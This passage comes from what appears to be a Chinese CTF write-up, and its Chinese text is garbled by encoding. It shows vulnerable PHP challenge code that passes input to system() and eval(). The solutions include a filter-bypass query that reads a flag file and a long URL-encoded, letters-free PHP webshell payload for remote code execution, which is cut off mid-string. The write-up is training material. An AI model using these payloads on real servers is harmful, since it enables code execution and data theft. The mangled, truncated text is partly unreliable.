function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/['\*\"[?]/"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'éé¢„æœŸä¿®å¤*2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å¿«åˆ°éæ´²äº†"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å»éæ´²å§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¿™é¢˜å’Œä¸Šé¢˜å·®ä¸å¤šï¼Œåªæ˜¯æœ€åçš„å‘½ä»¤å¤šè¿‡æ»¤äº†ä¸€äº›ï¼Œç›´æ¥ç»™å‡ºpayloadï¼š</p><pre class="language-none"><code class="language-none">?num&#x3D;1000000000000000.00000000000000010&amp;md5&#x3D;0e2010692162&amp;get_flag&#x3D;ca\t&lt;flag.ph\p</code></pre><h3 id="WEB-ä½ å–å§"><a href="#WEB-ä½ å–å§" class="headerlink" title="WEB_ä½ å–å§"></a>WEB_ä½ å–å§</h3><p>æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hint</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=hhh.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'e'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'g'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'h'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'i'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'j'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'l'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'o'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'q'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'t'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'v'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'y'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'z'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\~'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blacklisted</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blacklisted</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/im'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$code</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ç›´æ¥ç»™å‡ºPç¥çš„payload(æ— å­—æ¯æ•°å­—çš„RCE)ï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a></p><p>GETï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token 